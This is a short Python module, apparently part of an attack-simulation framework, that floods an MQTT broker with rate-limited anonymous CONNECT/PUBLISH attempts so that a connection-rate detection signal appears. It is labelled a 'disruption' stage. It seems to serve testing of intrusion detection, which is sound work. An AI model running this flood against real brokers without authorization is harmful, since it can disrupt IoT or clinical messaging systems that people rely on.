"""mqtt_flood: rapid MQTT CONNECT/PUBLISH attempts with no/invalid credentials. The broker
rejects them (realistic for an unauthenticated attacker); the point is the connection-rate
signal, not delivery. Bounded by a per-second rate and a duration."""
import time

import paho.mqtt.client as mqtt

from .. import util


def mqtt_flood(ctx, params):
    duration = int(params.get("duration", 30))
    rate = int(params.get("conn_per_s", 50))
    deadline = util.monotonic() + duration
    attempts = 0
    while util.monotonic() < deadline:
        c = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2,
                        client_id=f"flood-{attempts}")
        try:
            c.connect(ctx.broker_ip, 1883)          # anonymous -> refused by the broker
            c.publish("ward1/flood", "x", qos=0)
            c.disconnect()
        except Exception:
            pass
        attempts += 1
        time.sleep(1.0 / rate)
    return {"targets": [ctx.broker_ip],
            "notes": f"{attempts} CONNECT/PUBLISH attempts (~{rate}/s) over {duration}s, "
                     f"anonymous (rejected)"}


mqtt_flood.STAGE = "disruption"
